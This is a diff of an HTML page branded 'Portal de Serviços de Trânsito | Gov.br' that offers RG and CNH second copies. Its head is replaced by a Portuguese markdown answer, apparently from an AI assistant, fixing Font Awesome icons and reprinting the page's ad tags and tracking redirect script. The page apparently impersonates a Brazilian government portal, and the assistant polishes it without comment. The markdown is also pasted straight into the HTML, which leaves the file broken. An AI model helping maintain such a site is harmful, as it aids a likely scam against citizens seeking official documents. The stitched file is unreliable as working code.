@@ -1,93 +1,169 @@
 
-<!DOCTYPE html><html lang="pt-BR"><head>
-  <!-- Google tag (gtag.js) -->
-<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-CYPSPHG7VD"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+<!DOCTYPE html><html lang="pt-BR"># Solução para o Problema dos Ícones
 
-  gtag('config', 'G-CYPSPHG7VD');
-</script>
-  <!-- Google tag (gtag.js) -->
-<script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-16981780854"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+## Diagnóstico do Problema
 
-  gtag('config', 'AW-16981780854');
-</script>
-<title>Portal de Serviços de Trânsito | Gov.br</title>
-<meta name="description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato. Estes são documentos de identificação civil emitido pelos rgãos de segurança dos Estados da Federação e pelo Distrito Federal.">
-<meta name="keywords" content="rg, cnh, segunda via, tirar documento">
-<meta name="author" content="Gov.br">
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
-<meta name="msapplication-navbutton-color" content="#FFFFFF">
-<meta property="og:title" content="Portal de Serviços de Trânsito | Gov.br">
-<meta property="og:description" content="Emisso da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato. Estes são documentos de identificação civil emitido pelos órgãos de segurana dos Estados da Federação e pelo Distrito Federal.">
-<meta property="og:url" content="#">
-<meta property="og:type" content="website">
-<meta property="og:image" content="images/brasao.png">
-<link rel="shortcut icon" href="images/favicon.png">
-<link rel="icon" href="images/favicon.png" sizes="32x32">
-<link rel="icon" href="images/favicon.png" sizes="192x192">
-<link rel="apple-touch-icon" href="images/favicon.png">
-<meta name="msapplication-TileImage" content="images/favicon.png">
-<link href="css/bootstrap.min.css" rel="stylesheet">
+Analisando seu código HTML, identifiquei que os ícones não estão sendo carregados porque há problemas na configuração do Font Awesome. Seu código atual tem esta linha no `<head>`:
+
+```html
+<link href="css/all.min.css" rel="stylesheet">
+```
+
+## Principais Problemas Encontrados
+
+1. **Arquivo local pode não existir**: O arquivo `css/all.min.css` pode não estar presente no servidor
+2. **Mistura de versões**: Seu código usa diferentes prefixos (`fas`, `fa`, `fa-solid`) que podem ser incompatíveis
+3. **Dependência de arquivo local**: Não há fallback caso o arquivo local falhe
+
+## Soluções Recomendadas
+
+### Solução 1: Usar CDN do Font Awesome (Recomendada)
+
+Substitua a linha atual:
+```html
+<link href="css/all.min.css" rel="stylesheet">
+```
+
+Por esta linha que carrega do CDN:
+```html
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
-<link rel="stylesheet" href="css/toastify.min.css">
-<link href="css/style.css" rel="stylesheet">
-<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+```
+
+### Solução 2: CDN + Fallback Local
+
+Para maior segurança, use esta configuração que tenta o CDN primeiro e depois o arquivo local:
+
+```html
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
 <script>
-document.addEventListener("DOMContentLoaded", function() {
-    function salvarParametrosNoLocalStorage() {
-        const params = new URLSearchParams(window.location.search);
-        const googleData = {};
-
-        googleData.utm_source = 'organic';
-
-        params.forEach((value, key) => {
-            googleData[key] = value;
-        });
-
-        localStorage.setItem('google', JSON.stringify(googleData));
-        console.log(googleData);
-    }
-    salvarParametrosNoLocalStorage();
-    
-    const google= JSON.parse(localStorage.getItem('google')) || {};
-    const params = Object.entries(google)
-        .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
-        .join('&');
-        
-    var novaUrl1 = './pagina1/index.html';
-    var novaUrl2 = './pagina2/index.html';
-    var novaUrl3 = './pagina3/index.html';
-    var novaUrl4 = './pagina4/index.html';
-    var novaUrl5 = './pagina5/index.html';
-    
-    document.getElementById('service1').addEventListener('click', function() {
-        window.location.href = novaUrl1;
-    });
-    document.getElementById('service2').addEventListener('click', function() {
-        window.location.href = novaUrl2;
-    });
-    document.getElementById('service3').addEventListener('click', function() {
-        window.location.href = novaUrl3;
-    });
-    document.getElementById('service4').addEventListener('click', function() {
-        window.location.href = novaUrl4;
-    });
-    document.getElementById('service5').addEventListener('click', function() {
-        window.location.href = novaUrl5;
-    });
-});
+// Fallback para arquivo local se CDN falhar
+if (!window.FontAwesome) {
+    document.write('<link rel="stylesheet" href="css/all.min.css">');
+}
 </script>
+```
+
+### Solução 3: Padronizar Classes de Ícones
+
+Para evitar conflitos, padronize todas as classes de ícones. Recomendo usar apenas `fa-solid`, `fa-regular` ou `fa-brands`:
+
+**Antes:**
+```html
+<i class="fas fa-user"></i>
+<i class="fa fa-bars"></i>
+<i class="fa-solid fa-arrow-right"></i>
+```
+
+**Depois:**
+```html
+<i class="fa-solid fa-user"></i>
+<i class="fa-solid fa-bars"></i>
+<i class="fa-solid fa-arrow-right"></i>
+```
+
+## Código Corrigido para o Head
+
+Substitua a seção `<head>` do seu arquivo por esta versão corrigida:
+
+```html
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CYPSPHG7VD"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-CYPSPHG7VD');
+  </script>
+  
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16981780854"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-16981780854');
+  </script>
+  
+  <title>Portal de Serviços de Trânsito | Gov.br</title>
+  <meta name="description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato.">
+  <meta name="keywords" content="rg, cnh, segunda via, tirar documento">
+  <meta name="author" content="Gov.br">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#FFFFFF">
+  <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+  <meta name="msapplication-navbutton-color" content="#FFFFFF">
+  
+  <!-- Open Graph -->
+  <meta property="og:title" content="Portal de Serviços de Trânsito | Gov.br">
+  <meta property="og:description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH).">
+  <meta property="og:url" content="#">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="images/brasao.png">
+  
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="images/favicon.png">
+  <link rel="icon" href="images/favicon.png" sizes="32x32">
+  <link rel="icon" href="images/favicon.png" sizes="192x192">
+  <link rel="apple-touch-icon" href="images/favicon.png">
+  <meta name="msapplication-TileImage" content="images/favicon.png">
+  
+  <!-- CSS -->
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+  <!-- Font Awesome CDN - SOLUÇÃO PARA OS ÍCONES -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+  <link rel="stylesheet" href="css/toastify.min.css">
+  <link href="css/style.css" rel="stylesheet">
+  
+  <!-- Scripts -->
+  <script src="js/latest.js" data-utmify-prevent-subids="" async defer></script>
+  
+  <!-- Seu JavaScript existente -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        function salvarParametrosNoLocalStorage() {
+            const params = new URLSearchParams(window.location.search);
+            const googleData = {};
+            googleData.utm_source = 'organic';
+            params.forEach((value, key) => {
+                googleData[key] = value;
+            });
+            localStorage.setItem('google', JSON.stringify(googleData));
+            console.log(googleData);
+        }
+        salvarParametrosNoLocalStorage();
+        
+        const google = JSON.parse(localStorage.getItem('google')) || {};
+        const params = Object.entries(google)
+            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
+            .join('&');
+            
+        var novaUrl1 = './pagina1/index.html';
+        var novaUrl2 = './pagina2/index.html';
+        var novaUrl3 = './pagina3/index.html';
+        var novaUrl4 = './pagina4/index.html';
+        var novaUrl5 = './pagina5/index.html';
+        
+        document.getElementById('service1').addEventListener('click', function() {
+            window.location.href = novaUrl1;
+        });
+        document.getElementById('service2').addEventListener('click', function() {
+            window.location.href = novaUrl2;
+        });
+        document.getElementById('service3').addEventListener('click', function() {
+            window.location.href = novaUrl3;
+        });
+        document.getElementById('service4').addEventListener('click', function() {
+            window.location.href = novaUrl4;
+        });
+        document.getElementById('service5').addEventListener('click', function() {
+            window.location.href = novaUrl5;
+        });
+    });
+  </script>
 </head>
+  
 <body><header id="site-header">
     <div class="header-wrapper container">
         <div class="br-header">
